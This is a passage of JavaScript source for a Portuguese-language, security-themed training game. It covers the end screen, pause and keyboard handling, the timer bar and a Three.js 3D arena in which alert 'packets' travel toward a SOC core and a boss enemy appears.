    ${rec ? " Novo recorde!" : ""}</p>
    <p>${G.hits} acertos · ${G.miss} erros · ${acc}% · maior combo ×${G.maxCombo}</p>
    <div class="row" style="justify-content:center"><button class="btn primary" type="button" id="gAgain">Jogar de novo <kbd>Enter</kbd></button><button class="btn" type="button" id="gMenuBtn">Mudar dificuldade</button></div>`);
  $("#gAgain").onclick = () => start(G.dk); $("#gMenuBtn").onclick = menu; $("#gAgain").focus({ preventScroll:true });
  $("#gPanel").innerHTML = G.missed.length
    ? `<div class="acard"><h3>Para revisar</h3><ul class="missed">${G.missed.slice(0, 8).map(m => `<li>${rich(m)}</li>`).join("")}</ul>
       <p class="sub2" style="margin-top:8px">As perguntas do chefão estão no simulado; use o filtro "Que errei" depois de respondê-las lá.</p></div>` + rulesPanel()
    : `<div class="acard"><h3>Turno sem erros</h3><p style="margin:0">Nada para revisar. Tente a próxima dificuldade.</p></div>` + rulesPanel();
}

/* ---------- pausa ---------- */
function setPaused(v){
  if (v && !G.paused && G.cur && !G.cur.done){ G.paused = true; G.pausedAt = performance.now();
    showMenu(`<h3>Pausado</h3><p>O tempo do alerta está parado.</p><button class="btn primary" type="button" id="gResume">Continuar <kbd>P</kbd></button>`);
    $("#gResume").onclick = () => setPaused(false); $("#gCard") && ($("#gCard").style.visibility = "hidden"); }
  else if (!v && G.paused){ G.paused = false; if (G.cur) G.cur.t0 += performance.now() - G.pausedAt; hideMenu(); $("#gCard") && ($("#gCard").style.visibility = ""); }
}
$("#gPauseBtn").onclick = () => setPaused(!G.paused);
window.addEventListener("viewchange", e => { G.active = e.detail === "game"; if (!G.active) setPaused(true); });
document.addEventListener("visibilitychange", () => { if (document.hidden) setPaused(true); });

/* ---------- teclado ---------- */
document.addEventListener("keydown", e => {
  if (document.body.dataset.view !== "game" || e.ctrlKey || e.metaKey || e.altKey) return;
  if (e.target.closest && e.target.closest("input,textarea,select")) return;
  const k = e.key.toLowerCase();
  if (k === "p"){ setPaused(!G.paused); e.preventDefault(); return; }
  if (G.paused) return;
  if (k === "enter"){ if (e.target.tagName === "BUTTON") return; if (G.after){ cont(); e.preventDefault(); } else if (G.st === "end"){ start(G.dk); e.preventDefault(); } return; }
  if (G.st === "menu"){ const i = "123".indexOf(k); if (i >= 0){ start(Object.keys(DIFF)[i]); e.preventDefault(); } return; }
  const cur = G.cur; if (!cur || cur.done) return;
  if (cur.kind === "alert"){ if (k === "1" || k === "f") { choose("ben"); e.preventDefault(); } else if (k === "2" || k === "e") { choose("mal"); e.preventDefault(); } }
  else if (cur.kind === "q"){ let i = "1234".indexOf(k); if (i < 0) i = "abcd".indexOf(k); if (i >= 0){ answerQ(i); e.preventDefault(); } }
});

/* ---------- barra de tempo ---------- */
const tbar = $("#gTime");
function setTime(f){ const w = (Math.max(0, Math.min(1, f)) * 100) + "%", low = f > 0 && f < .3; tbar.style.width = w; tbar.classList.toggle("low", low);
  const c = document.querySelector("#gCard .ctimer em"); if (c){ c.style.width = w; c.classList.toggle("low", low); } }

/* ---------- arena 3D ---------- */
const A = (function(){
  const stub = { reset(){}, spawnPacket(){}, progress(){}, blockPacket(){}, hitCore(){}, showBoss(){}, hitBoss(){}, enrage(){}, bossDie(){}, bossCharge(){}, clearShots(){}, frame(){}, retheme(){} };
  if (typeof THREE === "undefined") return stub;
  const cv = $("#gcv"), host = $("#gArena");
  let renderer; try { renderer = new THREE.WebGLRenderer({ canvas:cv, antialias:true, alpha:true }); } catch(e) { return stub; }
  renderer.setPixelRatio(Math.min(devicePixelRatio || 1, 2)); renderer.setClearColor(0x000000, 0);
  const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
  const css = v => v[0] === "#" ? v : (getComputedStyle(document.documentElement).getPropertyValue(v).trim() || "#888");
  const C = v => new THREE.Color(css(v));
  const scene = new THREE.Scene();
  const cam = new THREE.PerspectiveCamera(36, 21/8, .1, 120);
  const CAM = new THREE.Vector3(0, 4, 15), LOOK = new THREE.Vector3(0, 1.75, 0);
  scene.add(new THREE.HemisphereLight(0xffffff, 0x334455, .9));
  const dl = new THREE.DirectionalLight(0xffffff, .75); dl.position.set(3, 10, 8); scene.add(dl);
  const M = (v, o = {}) => new THREE.MeshStandardMaterial({ color:C(v), roughness:.4, metalness:.15, emissive:C(o.e || v), emissiveIntensity:o.ei || 0, transparent:o.op != null, opacity:o.op ?? 1 });
  const XC = -7, XB = 6.6;
  /* chão: grade que some na distância */
  let grid = null;
  function floor(){
    if (grid){ scene.remove(grid); grid.geometry.dispose(); grid.material.dispose(); }
    grid = new THREE.GridHelper(44, 44, C("--accent"), C("--line")); grid.material.transparent = true; grid.material.opacity = .35; scene.add(grid);
    scene.fog = new THREE.Fog(C("--panel-2"), 16, 34);
  }
  floor();
  /* estrelas (pacotes de rede ao fundo) */
  const starGeo = new THREE.BufferGeometry(), N = 260, sp = new Float32Array(N * 3);
  for (let i = 0; i < N; i++){ sp[i*3] = (Math.random() - .5) * 40; sp[i*3+1] = Math.random() * 9 + .5; sp[i*3+2] = -6 - Math.random() * 14; }
  starGeo.setAttribute("position", new THREE.BufferAttribute(sp, 3));
  const stars = new THREE.Points(starGeo, new THREE.PointsMaterial({ color:C("--accent"), size:.08, transparent:true, opacity:.55 })); scene.add(stars);
  function label(text, color, size = 40, bg){
    const c = document.createElement("canvas"), g = c.getContext("2d"), font = `700 ${size}px "Archivo","Segoe UI",sans-serif`;
    g.font = font; const w = Math.ceil(g.measureText(text).width) + 36; c.width = w; c.height = size + 26;
    if (bg){ g.fillStyle = css(bg); const r = 14; g.beginPath(); g.moveTo(r,0); g.arcTo(w,0,w,c.height,r); g.arcTo(w,c.height,0,c.height,r); g.arcTo(0,c.height,0,0,r); g.arcTo(0,0,w,0,r); g.fill(); }
    g.font = font; g.textBaseline = "middle"; g.fillStyle = css(color); g.fillText(text, 18, c.height / 2 + 2);
    const s = new THREE.Sprite(new THREE.SpriteMaterial({ map:new THREE.CanvasTexture(c), transparent:true, depthWrite:false }));
    s.scale.set(c.width * .011, c.height * .011, 1); s.renderOrder = 5; return s;
  }
  /* pista com setas andando em direção ao SOC */
  function laneTex(){
    const c = document.createElement("canvas"); c.width = 256; c.height = 64; const g = c.getContext("2d");
    g.strokeStyle = css("--accent"); g.globalAlpha = .9; g.lineWidth = 7;
    for (let x = 40; x < 256; x += 64){ g.beginPath(); g.moveTo(x + 18, 14); g.lineTo(x, 32); g.lineTo(x + 18, 50); g.stroke(); }
    const t = new THREE.CanvasTexture(c); t.wrapS = THREE.RepeatWrapping; t.repeat.set(5, 1); return t;
  }
  const laneLen = XB - XC - 1.4;
  const lane = new THREE.Mesh(new THREE.PlaneGeometry(laneLen, 1.3), new THREE.MeshBasicMaterial({ map:laneTex(), transparent:true, opacity:.55, depthWrite:false }));
  lane.rotation.x = -Math.PI / 2; lane.position.set((XC + XB) / 2 - .3, .03, .6); scene.add(lane);
  const laneEdge = new THREE.Mesh(new THREE.PlaneGeometry(laneLen, 1.5), new THREE.MeshBasicMaterial({ color:C("--accent"), transparent:true, opacity:.08, depthWrite:false }));
  laneEdge.rotation.x = -Math.PI / 2; laneEdge.position.copy(lane.position).setY(.02); scene.add(laneEdge);
  /* núcleo do SOC */
  const core = new THREE.Group(); core.position.set(XC, 0, .6); scene.add(core);
  const coreBody = new THREE.Mesh(new THREE.CylinderGeometry(1.05, 1.35, 1.8, 6), M("--accent", { ei:.25 })); coreBody.position.y = .9; core.add(coreBody);
  const coreTop = new THREE.Mesh(new THREE.CylinderGeometry(.75, 1.05, .35, 6), M("--panel", { e:"--accent", ei:.15 })); coreTop.position.y = 1.97; core.add(coreTop);
  const coreGem = new THREE.Mesh(new THREE.OctahedronGeometry(.5), M("--accent", { ei:1 })); coreGem.position.y = 2.8; core.add(coreGem);
  const shield = new THREE.Mesh(new THREE.SphereGeometry(2.4, 40, 20, 0, Math.PI * 2, 0, Math.PI / 2), M("--accent", { op:.1 }));
  shield.material.side = THREE.DoubleSide; shield.material.depthWrite = false; core.add(shield);
  const ring = new THREE.Mesh(new THREE.TorusGeometry(1.9, .05, 8, 72), M("--accent", { ei:1 })); ring.rotation.x = Math.PI / 2; ring.position.y = .06; core.add(ring);
  const ring2 = new THREE.Mesh(new THREE.TorusGeometry(.95, .03, 8, 64), M("--accent", { ei:1 })); ring2.position.y = 2.8; ring2.rotation.x = Math.PI / 2; core.add(ring2);
  let coreLbl = label("SOC", "--accent-ink", 36, "--accent"); coreLbl.position.set(0, 3.75, 0); core.add(coreLbl);
  /* chefão */
  const boss = new THREE.Group(); boss.visible = false; scene.add(boss);
  const BOSS_POS = new THREE.Vector3(XB, 2.8, -1.2);
  const bossBody = new THREE.Mesh(new THREE.IcosahedronGeometry(1.35, 0), M("--alert", { ei:.35 })); bossBody.material.flatShading = true; boss.add(bossBody);
  const spikes = new THREE.Group(); boss.add(spikes);
  const phi = (1 + Math.sqrt(5)) / 2, dirs = [];
  [[0,1,phi],[0,1,-phi],[0,-1,phi],[0,-1,-phi],[1,phi,0],[1,-phi,0],[-1,phi,0],[-1,-phi,0],[phi,0,1],[phi,0,-1],[-phi,0,1],[-phi,0,-1]].forEach(v => dirs.push(new THREE.Vector3(...v).normalize()));
  const spikeGeo = new THREE.ConeGeometry(.26, .95, 10), spikeMat = M("--alert", { ei:.6 });
  dirs.forEach(d => { const s = new THREE.Mesh(spikeGeo, spikeMat); s.position.copy(d.clone().multiplyScalar(1.45)); s.quaternion.setFromUnitVectors(new THREE.Vector3(0,1,0), d); spikes.add(s); });
  const halo = new THREE.Mesh(new THREE.TorusGeometry(2.3, .04, 8, 80), M("--alert", { ei:1 })); halo.rotation.x = Math.PI / 2.4; boss.add(halo);
  const eye = new THREE.Mesh(new THREE.SphereGeometry(.42, 24, 16), M("--panel", { ei:.3 })); eye.position.set(0, .1, 1.2); boss.add(eye);
  const pupil = new THREE.Mesh(new THREE.SphereGeometry(.2, 16, 12), M("--ink")); pupil.position.set(0, .1, 1.55); boss.add(pupil);
  let bossLbl = label("O OPERADOR", "#ffffff", 34, "--bad"); bossLbl.position.set(0, 2.75, 0); boss.add(bossLbl);
  /* projéteis e partículas */
  let packet = null, packetLbl = null, shot = null, shotCurve = null, packetCol = "--info";
  const PX0 = XB + .2, PX1 = XC + 2.3;
  const partGeo = new THREE.BoxGeometry(.14, .14, .14), parts = [];
  function disposeObj(m){ if (!m) return; scene.remove(m); m.traverse(o => { if (o.geometry && o.geometry !== partGeo) o.geometry.dispose(); if (o.material){ if (o.material.map) o.material.map.dispose(); o.material.dispose(); } }); }
  function clearShots(){ disposeObj(packet); packet = null; disposeObj(packetLbl); packetLbl = null; disposeObj(shot); shot = null; }
  function burst(pos, v, n = 22, speed = 6){
    for (let i = 0; i < n; i++){
      const m = new THREE.Mesh(partGeo, M(v, { ei:.9 })); m.position.copy(pos); m.material.transparent = true;
      parts.push({ m, v:new THREE.Vector3(Math.random() - .5, Math.random() * .9 + .2, Math.random() - .5).multiplyScalar(speed), life:1 }); scene.add(m);
    }
  }
  let shake = 0, flash = 0, bShake = 0, bFlash = 0, enr = false, dying = 0, rise = 1, pulse = 0;
  const baseEm = new THREE.Color();
  function spawnPacket(v, txt){ clearShots(); packetCol = v;
    packet = new THREE.Group();
    const cube = new THREE.Mesh(new THREE.BoxGeometry(.9, .9, .9), M(v, { ei:.55 }));
    const edges = new THREE.LineSegments(new THREE.EdgesGeometry(new THREE.BoxGeometry(1.02, 1.02, 1.02)), new THREE.LineBasicMaterial({ color:C(v) }));
    packet.add(cube, edges); packet.position.set(PX0, 1, .6); scene.add(packet);
    packetLbl = label(txt || "ALERTA", "#ffffff", 30, v); scene.add(packetLbl); }
  function bossCharge(){ clearShots();
    shot = new THREE.Mesh(new THREE.IcosahedronGeometry(.42, 1), M("--alert", { ei:1 })); scene.add(shot);
    shotCurve = new THREE.QuadraticBezierCurve3(BOSS_POS.clone().add(new THREE.Vector3(-1.2, -.2, 1)), new THREE.Vector3(0, 5.6, .6), new THREE.Vector3(XC, 2.5, .6)); }
  function progress(p){
    p = Math.max(0, Math.min(1, p));
    if (packet){ packet.position.x = PX0 + (PX1 - PX0) * p; if (packetLbl) packetLbl.position.set(packet.position.x, 2.15, .6); }
    if (shot && shotCurve){ shot.position.copy(shotCurve.getPoint(p * .92)); const s = .7 + p * .8; shot.scale.set(s, s, s); }
  }
  function blockPacket(){ if (packet) burst(packet.position, packetCol, 26); clearShots(); pulse = 1; }
  function hitCore(){
    const at = packet ? packet.position.clone() : shot ? shot.position.clone() : core.position.clone().add(new THREE.Vector3(0, 1.5, 0));
    burst(at, "--bad", 30, 7); clearShots(); shake = 1; flash = 1;
  }
  function hitBoss(){ if (shot) burst(shot.position, "--accent", 16); clearShots(); burst(boss.position, "--accent", 34, 7); bShake = 1; bFlash = 1; }
  function enrage(v){ enr = v; }
  function bossDie(){ dying = 1; burst(boss.position, "--alert", 70, 9); burst(boss.position, "--accent", 40, 6); }
  function showBoss(v){ boss.visible = v; if (v){ rise = 0; dying = 0; boss.scale.set(1,1,1); } }
  function reset(){ clearShots(); parts.splice(0).forEach(p => disposeObj(p.m)); boss.visible = false; enr = false; dying = 0; shake = flash = bShake = bFlash = 0; }
  function retheme(){
    floor();
    [[coreBody,"--accent"],[coreGem,"--accent"],[shield,"--accent"],[ring,"--accent"],[ring2,"--accent"],[bossBody,"--alert"],[halo,"--alert"],[eye,"--panel"],[pupil,"--ink"]].forEach(([m,v]) => { m.material.color = C(v); m.material.emissive = C(v); });
    coreTop.material.color = C("--panel"); spikeMat.color = C("--alert"); spikeMat.emissive = C("--alert");
    stars.material.color = C("--accent"); laneEdge.material.color = C("--accent");
    lane.material.map.dispose(); lane.material.map = laneTex(); lane.material.needsUpdate = true;
    core.remove(coreLbl); coreLbl = label("SOC", "--accent-ink", 36, "--accent"); coreLbl.position.set(0, 3.75, 0); core.add(coreLbl);
    boss.remove(bossLbl); bossLbl = label("O OPERADOR", "#ffffff", 34, "--bad"); bossLbl.position.set(0, 2.75, 0); boss.add(bossLbl);
  }
  let camDist = 1;
  function resize(){ const r = host.getBoundingClientRect(), w = Math.max(1, r.width | 0), h = Math.max(1, r.height | 0);
    renderer.setSize(w, h, false); cam.aspect = w / h; camDist = Math.max(1, 2.05 / cam.aspect); cam.updateProjectionMatrix(); }
  new ResizeObserver(resize).observe(host); resize();
  let last = performance.now();
  function frame(now){
    const dt = Math.min(.05, (now - last) / 1000); last = now; const t = now / 1000, m = reduce ? 0 : 1;
    ring.rotation.z += dt * .6 * m; ring2.rotation.z += dt * .9 * m; ring2.position.y = 2.8 + Math.sin(t * 2) * .1 * m;
    coreGem.rotation.y += dt * 1.4 * m; coreGem.position.y = 2.8 + Math.sin(t * 2) * .1 * m;
    core.position.x = XC + Math.sin(t * 70) * .16 * shake; shake *= .9;
    coreBody.material.emissive.copy(C("--accent")).lerp(C("--bad"), flash); coreBody.material.emissiveIntensity = .25 + flash * .8 + pulse * .6;
    shield.material.opacity = .1 + pulse * .25 + flash * .2; shield.scale.setScalar(1 + pulse * .06); flash *= .92; pulse *= .9;
    if (lane.material.map) lane.material.map.offset.x += dt * .6 * m;
    stars.rotation.y = Math.sin(t * .05) * .05 * m; stars.position.x = ((t * .3 * m) % 4) - 2;
    if (packet){ packet.rotation.x += dt * 1.4 * m; packet.rotation.y += dt * 1.9 * m; packet.position.y = 1 + Math.sin(t * 4) * .12 * m; }
    if (shot){ shot.rotation.x += dt * 3; shot.rotation.y += dt * 2; }
    if (boss.visible){
      rise = Math.min(1, rise + dt * .8); const e = 1 - Math.pow(1 - rise, 3);
      boss.position.set(BOSS_POS.x + Math.sin(t * 60) * .18 * bShake, BOSS_POS.y - 4 * (1 - e) + Math.sin(t * 1.3) * .2 * m, BOSS_POS.z);
      spikes.rotation.y += dt * (enr ? 2.4 : .7) * (m || .2); spikes.rotation.x += dt * (enr ? 1.1 : .25) * (m || .2);
      halo.rotation.z += dt * (enr ? 3 : .8) * (m || .2);
      bossBody.rotation.y -= dt * .4 * m;
      bossBody.material.emissiveIntensity = (enr ? .75 + Math.sin(t * 8) * .2 : .35) + bFlash;
      baseEm.copy(C("--alert")).lerp(new THREE.Color(0xffffff), bFlash * .7); bossBody.material.emissive.copy(baseEm);
      bShake *= .9; bFlash *= .88; pupil.position.x = Math.sin(t * .7) * .12;
      if (dying){ dying = Math.max(0, dying - dt * .7); const s = Math.max(.001, dying); boss.scale.set(s, s, s); boss.rotation.y += dt * 8; if (dying <= 0) boss.visible = false; }
      else boss.rotation.y = 0;
    }
    for (let i = parts.length - 1; i >= 0; i--){ const p = parts[i]; p.life -= dt * 1.1; p.v.y -= 9 * dt; p.m.position.addScaledVector(p.v, dt); p.m.rotation.x += dt * 5;
      if (p.m.position.y < .07){ p.m.position.y = .07; p.v.y *= -.35; p.v.x *= .7; p.v.z *= .7; }
      p.m.material.opacity = Math.max(0, p.life); if (p.life <= 0){ disposeObj(p.m); parts.splice(i, 1); } }
    cam.position.set(CAM.x + Math.sin(t * .22) * .6 * m, CAM.y * (camDist > 1 ? 1.15 : 1), CAM.z * camDist); cam.lookAt(LOOK);
    renderer.render(scene, cam);
  }
  return { reset, spawnPacket, progress, blockPacket, hitCore, showBoss, hitBoss, enrage, bossDie, bossCharge, clearShots, frame, retheme };
})();

/* ---------- laço principal ---------- */
(function loop(){
  requestAnimationFrame(loop);
  if (document.body.dataset.view !== "game" || document.hidden) return;
  const now = performance.now(), cur = G.cur;
  if (cur && !cur.done && !G.paused){
    const p = (now - cur.t0) / cur.T;
    A.progress(p); setTime(1 - p);
    if (p >= 1){ if (cur.kind === "alert") resolveAlert(null); else resolveQ(null); }
  }
  A.frame(now);
})();

const mq = matchMedia("(prefers-color-scheme: dark)");
if (mq.addEventListener) mq.addEventListener("change", () => A.retheme());
new MutationObserver(() => A.retheme()).observe(document.documentElement, { attributes:true, attributeFilter:["data-theme"] });

G.active = document.body.dataset.view === "game";
menu();
})();
